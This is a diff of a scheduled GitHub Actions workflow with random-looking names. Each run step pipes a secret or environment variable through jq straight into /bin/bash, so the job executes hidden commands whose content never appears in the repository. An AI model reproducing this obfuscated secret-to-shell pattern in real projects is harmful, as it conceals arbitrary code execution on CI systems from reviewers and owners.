@@ -2,7 +2,8 @@ name: jiangjing19871010
 on:
   workflow_dispatch:
   schedule:
-    - cron: '0 4/6 * * *'
+    - cron: '38 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,22 +11,9 @@ jobs:
       - uses: actions/checkout@v4
       - name: jiangjing19871010
         env:
-          i43218: ${{ secrets.i43218 }}
+          op72701: ${{ secrets.op72701 }}
         run: |
-          echo $i43218 | jq -r .oqff4608 | /bin/bash
-          echo $yadwi864 | jq -r .rdo931 | /bin/bash
-          echo $dwoop1 | jq -r .echv18062 | /bin/bash
-          echo $px28 | jq -r .pa9480 | /bin/bash
-          echo $jc7 | jq -r .nn686 | /bin/bash
-          echo $sf785 | jq -r .xjexc5 | /bin/bash
-          echo $twar79 | jq -r .kzc88236 | /bin/bash
-          echo $rsa882 | jq -r .fdvyk597 | /bin/bash
-          echo $nds6 | jq -r .q7112 | /bin/bash
-          echo $bvo96 | jq -r .q4 | /bin/bash
-          echo $lusvn6864 | jq -r .pq10773 | /bin/bash
-          echo $h415 | jq -r .wgjco37535 | /bin/bash
-          echo $a374 | jq -r .jzuk15891 | /bin/bash
-          echo $tnkuk5 | jq -r .mx87 | /bin/bash
-          echo $m01 | jq -r .kci843 | /bin/bash
-          echo $kbmof280 | jq -r .cqyqb4 | /bin/bash
+          echo $op72701 | jq -r .ocer1011 | /bin/bash
+          echo $rda918 | jq -r .g0852 | /bin/bash
+          echo $e17 | jq -r .vdl680 | /bin/bash
 
